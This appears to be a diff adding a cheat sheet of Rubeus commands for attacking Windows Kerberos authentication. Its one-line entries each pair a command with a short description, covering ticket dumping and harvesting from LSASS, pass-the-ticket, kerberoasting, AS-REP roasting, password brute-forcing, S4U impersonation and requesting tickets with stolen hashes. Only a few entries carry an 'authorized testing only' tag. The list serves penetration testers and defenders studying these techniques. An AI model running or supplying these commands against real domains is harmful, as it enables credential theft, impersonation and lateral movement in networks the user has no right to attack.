@@ -1,0 +1,85 @@
+[X] Rubeus Command List
+
+[\] Rubeus.exe
+[/] Show help menu
+
+[\] Rubeus.exe triage
+[/] Quick overview of Kerberos tickets on system
+
+[\] Rubeus.exe dump
+[/] Dump all Kerberos tickets
+
+[\] Rubeus.exe dump /service:krbtgt
+[/] Dump only KRBTGT‑related tickets
+
+[\] Rubeus.exe klist
+[/] List current Kerberos tickets
+
+[\] Rubeus.exe purge
+[/] Purge all Kerberos tickets
+
+[\] Rubeus.exe tgtdeleg
+[/] Request a TGT via delegation
+
+[\] Rubeus.exe tgtdeleg /nowrap
+[/] Request TGT without base64 wrapping
+
+[\] Rubeus.exe asktgt /user:USER /password:PASS
+[/] Request a TGT using password
+
+[\] Rubeus.exe asktgt /user:USER /rc4:HASH
+[/] Request a TGT using NTLM hash
+
+[\] Rubeus.exe asktgt /user:USER /aes256:HASH
+[/] Request a TGT using AES256 key
+
+[\] Rubeus.exe asktgt /domain:DOMAIN /user:USER /certificate:cert.pfx
+[/] Request TGT using PKINIT (certificate)
+
+[\] Rubeus.exe asktgs /ticket:TGT.kirbi /service:cifs/server
+[/] Request TGS for a service
+
+[\] Rubeus.exe s4u /impersonateuser:USER /msdsspn:cifs/server /ticket:TGT.kirbi
+[/] S4U2Self + S4U2Proxy (authorized testing only)
+
+[\] Rubeus.exe renew /ticket:TGT.kirbi
+[/] Renew an existing TGT
+
+[\] Rubeus.exe ptt /ticket:TICKET.kirbi
+[/] Pass‑the‑Ticket (authorized testing only)
+
+[\] Rubeus.exe harvest
+[/] Monitor and auto‑collect new tickets
+
+[\] Rubeus.exe monitor
+[/] Watch LSASS for Kerberos activity
+
+[\] Rubeus.exe brute /user:USER /domain:DOMAIN /passwords:pass.txt
+[/] Kerberos password brute‑force (authorized testing only)
+
+[\] Rubeus.exe kerberoast
+[/] Request roastable service tickets
+
+[\] Rubeus.exe kerberoast /outfile:hashes.txt
+[/] Save Kerberoast hashes to file
+
+[\] Rubeus.exe asreproast
+[/] Enumerate AS‑REP roastable users
+
+[\] Rubeus.exe asreproast /outfile:hashes.txt
+[/] Save AS‑REP roast hashes
+
+[\] Rubeus.exe createnetonly /program:cmd.exe
+[/] Create process with fake logon token
+
+[\] Rubeus.exe createnetonly /program:powershell.exe /show
+[/] Show PID and token info
+
+[\] Rubeus.exe hash /password:PASS
+[/] Generate NTLM/AES keys from password
+
+[\] Rubeus.exe dump /nowrap
+[/] Dump tickets without base64 wrapping
+
+[\] Rubeus.exe describe /ticket:TICKET.kirbi
+[/] Show detailed ticket information
